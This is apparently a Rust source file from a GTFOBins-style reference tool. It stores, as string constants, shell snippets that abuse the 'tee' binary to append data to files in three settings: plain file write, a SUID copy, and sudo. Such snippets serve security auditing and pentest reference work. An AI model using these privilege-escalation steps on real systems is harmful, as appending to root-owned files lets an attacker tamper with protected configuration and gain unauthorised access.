pub static BIN_NAME: &'static str = "tee";
pub static BIN_DESC: &'static str = "It can only append data if the destination exists";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    echo DATA | ./tee -a "$LFILE"
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which tee) .

    LFILE=file_to_write
    echo DATA | ./tee -a "$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_write
    echo DATA | sudo tee -a "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
